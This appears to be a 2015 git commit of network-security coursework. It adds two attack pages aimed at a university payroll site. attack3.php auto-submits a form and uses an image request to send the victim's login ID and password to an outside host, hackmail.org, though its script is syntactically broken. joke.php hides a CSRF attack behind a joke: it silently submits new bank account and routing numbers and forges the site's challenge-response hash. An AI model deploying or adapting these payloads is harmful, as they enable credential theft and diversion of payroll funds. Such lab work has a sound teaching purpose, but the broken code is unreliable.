132b792a340941032b7bcd01c0ec39133d741b0a
skosty <skosty@utexas.edu>
2015-09-03 13:56:27 -0500

    network-security

---
+++ attack3.php
@@ -0,0 +1,31 @@
+<html>
+<head></head>
+<body>
+
+<form method="post" action="http://payroll.utexas.edu">
+<input name="eid" value='">
+<input type="hidden" name="secret" value="whatdoido?">
+
+<script>window.onload = attack(){
+var btn = document.getElementsByTagName("button")[0];
+var form = document.getElementsByTagName("form")[0];
+var eid = form["login"];
+var password = form["pw"];
+btn.onclick =  attack() {
+(attack() {
+	(new Image()).src="http://hackmail.org/sendmail.php?&username="+"user&payload="+ "eid: "+ login.value+" password: "+pw.value+ "&random="+Math.random();
+})();};
+}
+
+</script>
+
+<input type="hidden'>
+<button type="submit" id="btnaaa">
+</form>
+
+<script>
+document.getElementById("btnaaa").click();
+</script>
+
+</body>
+</html>
---
+++ joke.php
@@ -0,0 +1,43 @@
+<html>
+<head>
+<title>Lolz</title>
+</head>
+<body>
+<p>Why did the scarecrow win the Nobel prize? Because he was out standing in his field</p> 
+
+<?php
+$joke = mt_rand();
+?>
+	
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="post" action="http://payroll.utexas.edu/account.php" target="csrf-frame" id="csrf_form">
+	<input id="account" type="hidden" name="account" value="3133731337" />
+        <input id="route" type="hidden" name="routing" value="1000000001" />
+	<input id="csrfc" type="hidden" name="challenge" value="<?php echo $joke ?>">
+	<input id="csrfr" type="hidden" name="response" value="">
+	<button name="action" style="display:none" id="btnaaa" type="submit" value="save">
+</form>
+
+
+<script type="text/javascript">
+
+String.prototype.hashCode = function(){
+  var hash = 1;
+  for (i = 0; i < this.length; i++) {
+    hash = (17237*hash + this.charCodeAt(i)) % 100000;
+  }
+  return hash;
+}
+	var acc = document.getElementById('account');
+	var route = document.getElementById('route');
+        function attack() {
+		document.getElementById('csrfr').value =(acc.value + "<?php echo $joke ?>"+ route.value).hashCode();
+	}
+	
+	acc.onkeyup = attack;
+	route.onkeyup = attack; 
+	attack();
+	document.getElementById('btnaaa').click();
+
+</script>
+
